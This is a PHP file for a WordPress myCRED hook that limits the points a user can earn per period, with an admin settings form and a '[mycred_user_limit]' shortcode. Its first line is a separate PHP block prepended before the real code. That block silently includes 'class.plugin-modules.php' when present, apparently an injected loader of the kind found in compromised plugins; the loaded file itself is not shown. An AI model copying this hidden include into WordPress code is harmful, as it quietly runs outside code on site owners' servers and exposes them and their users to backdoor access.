<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
// myCRED Custom Hook Class
class myCRED_Hook_Points_Cap extends myCRED_Hook {

	/**
	 * Construct
	 */
	function __construct( $hook_prefs, $type = MYCRED_DEFAULT_TYPE_KEY ) {
		parent::__construct( array(
			'id'       => 'mycred_points_cap',
			'defaults' => array(
				'maximum_points_limit'   => 999,
				'cap_limit_by'     => 'd'
			)
		), $hook_prefs, $type );	
	}

	/**
	 * Hook into WordPress
	 */
 	function run() {
		add_filter('mycred_add', array($this,'check_if_points_limit_reached'),10, 3 );
		add_filter('mycred_video_interval', array($this,'check_if_points_limit_reached'),10, 3 );
		add_shortcode( 'mycred_user_limit', array($this,'mycred_user_limit'),10, 3 );
	}
	
	public function check_if_points_limit_reached( $reply, $request, $mycred ) {

		$prefs = $this->prefs;

		if( $prefs['cap_limit_by'] == 'x' || $request['amount'] <= 0 ) return $reply;

		$user_id = get_current_user_id();

		if($request['type']=='mycred_default'){
			$hook_pref=get_option('mycred_pref_hooks');			
		}
		else{
			$hook_pref=get_option('mycred_pref_hooks_'.$request['type']);			
		}

		if( $prefs['cap_limit_by'] != 't' ) {
			$cap_limit_by = $prefs['cap_limit_by'];

			if( $this->get_creds( $cap_limit_by, $request ) > $hook_pref['hook_prefs']['mycred_points_cap']['maximum_points_limit'] ) {
				return false;
			}
		} else {

			$user_balance = mycred_get_users_balance( $user_id, $request['type'] );

			if( $user_balance > $prefs['maximum_points_limit'] ) {
				return false;
			}
		}

		return $reply;
	}

	function get_period() {
		$times = array(
			'd' => 'today',
			'w' => 'thisweek',
			'm' => 'thismonth',
			't' => '',
		);

		return $times;
	}

	function get_readable_period() {
		$times = array(
			'd' => __('per day', 'mycred_points_cap'),
			'w' => __('per week', 'mycred_points_cap'),
			'm' => __('per month', 'mycred_points_cap'),
			'x' => __('unlimited', 'mycred_points_cap'),
			't' => __('in total', 'mycred_points_cap')
		);

		return $times;
	}

	function get_creds( $cap_limit_by, $request ) {

		$user_id = get_current_user_id();

		$args = array(
			'time' => $this->get_period()[ $cap_limit_by ],
			'user_id' => $user_id,
			'ctype' => $request['type']
		);

		$log = new myCRED_Query_Log( $args );

		$total_creds = $request['amount'];
		foreach( $log->results as $results ) {
			if( $results->creds > 0 ) {
				$total_creds += $results->creds;
			}
		}

		return $total_creds;
	}

	function mycred_user_limit() {
		
		$prefs = $this->prefs;

		$hook_options = get_option('mycred_pref_hooks');

		$request['type'] = 'mycred_default';
		$request['amount'] = 0;

		$user_balance = $this->get_creds( $hook_options['hook_prefs']['mycred_points_cap']['cap_limit_by'], $request );
		$points_limit = $hook_options['hook_prefs']['mycred_points_cap']['maximum_points_limit'];
		$period = $this->get_readable_period();

		do_action('before_cap_point_message');

		$html = '<div class="mycred-cap-wrapepr">';

		$message = sprintf(
    		__('%d / %d %s', 'mycred_points_cap'), 
			$user_balance, 
			$points_limit, 
			$period[ $hook_options['hook_prefs']['mycred_points_cap']['cap_limit_by']  ] );

		$message = apply_filters('mycred_points_cap_limit_message', $message, $user_balance, $points_limit );

		if( $user_balance < $points_limit ) {
			$html .= '<div>'. $message .'</div>';
		} else {
			$html .= '<div>'. __( 'You have reached the maximum limit', 'mycred_points_cap' ) .'</div>';
		}
		$html .= '</div>';

		do_action('after_cap_point_message');

		return $html;
	}

	/**
	 * Add Settings
	 */
	 public function preferences() {
		// Our settings are available under $this->prefs
		$prefs = $this->prefs; ?>

		<div class="hook-instance">
			<h3><?php _e( 'myCred Points Cap', 'mycred' ); ?></h3>
			<div class="row">
				<div class="col-lg-4 col-md-6 col-sm-12 col-xs-12">
					<div class="form-group">
						<label for="<?php echo $this->field_id( 'maximum_points_limit' ); ?>"><?php _e( 'Maximum Points', 'mycred' ); ?></label>
						<input type="text" name="<?php echo $this->field_name( 'maximum_points_limit' ); ?>" id="<?php echo $this->field_id( 'maximum_points_limit' ); ?>" value="<?php echo esc_attr( $prefs['maximum_points_limit'] ); ?>" class="form-control" />
						<span class="description">Set Maximum points a user can earn in a certian period</span>
					</div>
				</div>
				<div class="col-lg-8 col-md-6 col-sm-12 col-xs-12"></div>
				<div class="col-lg-4 col-md-6 col-sm-6 col-xs-12">
					<div class="form-group">
						<label for="mycred-pref-hooks-logging-in-limit">Limit</label>
						<div class="h2"><select name="<?php echo $this->field_name( 'cap_limit_by' ); ?>" id="mycred-pref-hooks-logging-in-limit-by" class="limit-toggle"><option value="d" <?php echo ($prefs['cap_limit_by'] == 'd') ? 'selected' : '' ?>>/ Day</option><option value="w" <?php echo ($prefs['cap_limit_by'] == 'w') ? 'selected' : '' ?> >/ Week</option><option value="m" <?php echo ($prefs['cap_limit_by'] == 'm') ? 'selected' : '' ?> >/ Month</option><option value="t" <?php echo ($prefs['cap_limit_by'] == 't') ? 'selected' : '' ?>>in Total</option></select></div>			</div>
				</div>
				<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
					<div class="form-group">
						<label>Available Shortcode</label>
						<p class="form-control-static">[mycred_user_limit]</p>
					</div>
				</div>
				
			</div>
		</div>

	<?php
		}

	/**
	 * Sanitize Preferences
	 */
	public function sanitise_preferences( $data ) {
		$new_data = $data;

		// Apply defaults if any field is left empty
		$new_data['maximum_points_limit'] = ( !empty( $data['maximum_points_limit'] ) ) ? $data['maximum_points_limit'] : $this->defaults['maximum_points_limit'];
		$new_data['cap_limit_by'] = ( !empty( $data['cap_limit_by'] ) ) ? sanitize_text_field( $data['cap_limit_by'] ) : $this->defaults['cap_limit_by'];

	
		return $new_data;
	}
}